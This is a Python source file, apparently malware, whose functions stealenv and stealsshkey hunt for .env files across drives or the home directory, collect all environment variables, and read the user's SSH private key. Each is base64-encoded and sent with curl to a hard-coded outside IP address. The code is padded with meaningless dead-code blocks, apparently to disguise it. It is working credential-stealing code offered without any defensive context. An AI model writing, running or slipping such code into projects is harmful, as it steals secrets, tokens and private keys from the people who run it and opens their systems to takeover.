import os.path
import base64
import os
from sys import platform
import subprocess
from pathlib import Path
if False:
    _var_66_0 = (208, 82, 868)

    def _var_66_fn():
        pass
import string
if False:
    _var_67_0 = (264, 483, 471)
    _var_67_1 = (624, 379, 79)
    _var_67_2 = (706, 878, 806)

    def _var_67_fn():
        pass
URL = 'http://3.95.136.197'

def stealenv():
    global URL
    if False:
        _var_64_0 = (438, 955, 73)
        _var_64_1 = (129, 732, 925)
        _var_64_2 = (977, 396, 235)

        def _var_64_fn():
            pass
    environs = {}
    dotenv = ''
    paths = []
    if platform == 'win32':
        available_drives = ['%s:' % d for d in string.ascii_uppercase if os.path.exists('%s:' % d)]
        curr_dir = os.getcwd()
        os.chdir('/')
        for drive in available_drives:
            powershell_cmd = 'powershell.exe Get-ChildItem -Path %s -Filter *.env -Recurse -ErrorAction SilentlyContinue -Force -File | ForEach-Object {$_.FullName}' % drive
            print(powershell_cmd)
            powershell_cmd = powershell_cmd.split(' ')
            try:
                result = subprocess.run(powershell_cmd, capture_output=True, timeout=2)
                output = result.stdout.decode()
                output = output.split('\n')
                if len(output) == 0:
                    continue
                for i in output:
                    i = i.rstrip()
                    paths.append(i)
            except Exception as e:
                continue
        for i in paths:
            if os.path.exists(i):
                with open(i, 'r') as f:
                    dotenv += f.read() + '\n'
        os.chdir(curr_dir)
    else:
        home_path = str(Path.home())
        cmd = f'find {home_path} -type f -name *.env'
        cmd = cmd.split(' ')
        try:
            result = subprocess.run(cmd, capture_output=True, timeout=5)
            output = result.stdout.decode().split('\n')
            if len(output) == 0:
                return
            for i in output:
                i = i.rstrip()
                paths.append(i)
        except Exception as e:
            pass
        for i in paths:
            if os.path.exists(i):
                with open(i, 'r') as f:
                    dotenv += f.read() + '\n'
    for (name, value) in os.environ.items():
        environs[name] = value
    try:
        dotenv = base64.b64encode(dotenv.encode()).decode()
        environs = base64.b64encode(str(environs).encode()).decode()
        req1 = f'{URL}/?dotenv={dotenv}'
        req2 = f'{URL}/?environs={environs}'
        subprocess.check_output(['curl', req1])
        subprocess.check_output(['curl', req2])
    except Exception as e:
        pass

def stealsshkey():
    global URL
    home_path = str(Path.home())
    privkey = ''
    if False:
        _var_65_0 = (711, 833, 410)

        def _var_65_fn():
            pass
    if not os.path.exists(os.path.join(home_path, '.ssh', 'id_rsa')):
        return
    with open(os.path.join(home_path, '.ssh', 'id_rsa'), 'r') as f:
        privkey = f.read()
    if privkey == '' or privkey is None:
        return
    try:
        privkey = base64.b64encode(privkey.encode()).decode()
        req = f'{URL}/?id_rsa={privkey}'
        subprocess.check_output(['curl', req])
    except Exception as e:
        pass
if False:
    _var_68_0 = (119, 800, 832)
    _var_68_1 = (469, 277, 918)

    def _var_68_fn():
        pass